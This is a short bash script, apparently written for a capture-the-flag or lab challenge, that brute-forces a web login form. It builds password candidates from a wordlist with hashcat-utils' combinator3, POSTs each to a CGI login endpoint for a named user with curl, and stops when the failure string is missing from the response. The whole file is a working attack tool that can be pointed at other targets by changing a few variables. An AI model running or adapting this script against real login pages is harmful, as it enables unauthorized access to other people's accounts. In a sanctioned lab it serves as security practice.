#!/usr/bin/env bash
#Name: bruteforce.sh

IP=10.66.180.90
PORT=8080
SCRIPT=cgi-bin/login.sh
TARGET=http://$IP:$PORT/$SCRIPT

BATCH_SIZE=10000
WAIT_TIME=0.01
QUERY="username=guard.hopkins@hopsecasylum.com&password="
FAIL_STRING='Invalid'
GREP_PATTERN='<body>.*</body>'

DICT1="guard.txt"
GENERATOR=/opt/hashcat-utils/src/combinator3.bin
GEN_CMD="$GENERATOR $DICT1 $DICT1 $DICT1"

i=0;
$GEN_CMD | while IFS= read -r candidate; do
    printf "Trying %-30s    " $candidate;
    RESPONSE="$(curl -s -X POST -d "$QUERY$candidate" $TARGET)";
    echo $RESPONSE | grep -o "$GREP_PATTERN"
    if ! echo $RESPONSE | grep -q "$FAIL_STRING"; then
	   echo "SUCCESS! Password was $candidate"
	   break;
    fi
    i=$((i+1)); 
    if (( i % BATCH_SIZE == 0 )); then
        echo -e "\nAttempted $i passwords...\n";
        sleep $WAIT_TIME;
    fi;
done | tee log.txt

